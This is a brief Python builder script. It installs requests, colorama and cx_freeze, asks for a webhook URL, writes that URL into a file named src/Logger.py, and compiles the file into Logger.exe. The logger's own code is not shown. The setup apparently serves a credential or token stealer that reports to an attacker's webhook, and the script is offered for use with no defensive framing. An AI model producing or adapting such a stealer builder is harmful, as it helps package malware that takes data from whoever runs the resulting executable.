import os, io, time, sys

os.system('pip install requests')
os.system('pip install colorama')
os.system("pip install cx_freeze")

import colorama
from colorama import *

def clear():
    os_name = os.name
    if os_name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

clear()
webhook = input("{}[!]{} Webhook: ".format(Fore.LIGHTCYAN_EX, Fore.RESET))

try:
    with io.open(os.path.join("src", "Logger.py"), "r", encoding="utf8") as file:
        lines = file.readlines()
    lines[10] = "webhook_url = '{}'\n".format(webhook)

    with io.open(os.path.join("src", "Logger.py"), "w", encoding="utf8") as file:
        file.writelines(lines)

    os.system('''cxfreeze src\Logger.py --target-dir dist --target-name Logger.exe --base console''')

except IOError:
    print(IOError)